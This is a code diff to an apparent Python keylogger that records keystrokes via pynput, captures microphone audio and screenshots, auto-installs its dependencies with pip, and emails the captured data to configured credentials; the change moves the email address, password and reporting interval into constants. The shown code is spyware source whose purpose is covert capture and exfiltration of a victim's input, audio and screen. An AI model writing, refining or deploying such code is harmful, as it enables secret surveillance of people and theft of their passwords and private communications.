@@ -15,6 +15,10 @@ except ModuleNotFoundError:
     modules = ["pyscreenshot","sounddevice","pynput"]
     call("pip install " + ' '.join(modules), shell=True)
 
+EMAIL_ADDRESS = "YOUR_EMAIL"
+EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
+SEND_REPORT_EVERY = 60 # as in seconds
+
 finally:
     class KeyLogger:
         def __init__(self, time_interval, email, password):
@@ -87,12 +91,13 @@ finally:
             obj.writeframesraw(myrecording)
             sd.wait()
 
-            self.send_mail(email="MAIL", password="PASSWORD", message=obj)
+            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
+
 
         def screenshot(self):
             img = pyscreenshot.grab()
-            self.send_mail(email="MAIL", password="PASSWORD", message=img)
-
+            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
+            
         def run(self):
             keyboard_listener = keyboard.Listener(on_press=self.save_data)
             with keyboard_listener:
@@ -122,8 +127,5 @@ finally:
                     print('File is close.')
 
 
-    email_address = "YOUR MAIL"
-    password = "YOUR PASSWORD"
-
-    keylogger = KeyLogger(10, email_address, password)
+    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
     keylogger.run()
